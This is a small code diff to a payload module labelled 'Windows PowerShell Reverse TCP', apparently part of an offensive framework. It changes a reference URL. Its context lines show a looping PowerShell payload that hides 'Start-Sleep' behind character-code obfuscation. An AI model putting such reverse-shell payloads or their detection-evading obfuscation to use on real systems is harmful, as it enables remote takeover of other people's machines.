@@ -6,7 +6,7 @@ class Payload:
         'Title' : 'Windows PowerShell Reverse TCP',
         'Author' : 'r0jahsm0ntar1',
         'Description' : 'Classic PowerShell Reverse TCP',
-        'References' : ['https://revshells.com']
+        'References' : ['https://github.com/r0jahsm0ntar1/africana-framework']
     }
 
     meta = {
@@ -44,4 +44,3 @@ class Payload:
     & ([string]::join('', ( (83,116,97,114,116,45,83,108,101,101,112) |%{$($_)}|%{ ( [char][int] $($_))})) |%{$_}| % {$_}) -Seconds 15
 } while ($true)
 """
-    
